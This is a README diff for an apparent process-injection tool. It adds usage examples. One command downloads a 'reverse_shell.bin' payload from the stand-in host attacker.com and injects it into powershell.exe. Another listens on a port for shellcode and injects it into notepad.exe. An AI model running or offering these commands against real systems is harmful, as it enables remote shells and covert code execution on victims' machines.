@@ -18,8 +18,16 @@ Options:
         -l       Listen mode port (Not download mode).
 ```
 
-compile using gcc/g++ or visual studio and run for example:
+## Examples
 
+Download and inject to powershell.exe
 ```shell
 injector.exe -u http://attacker.com/reverse_shell.bin -p powershell.exe
 ```
+
+Wait for connection on port 8080, receive shellcode and inject to owned notepad.exe
+```shell
+injector.exe -l 8080
+```
+
+ 
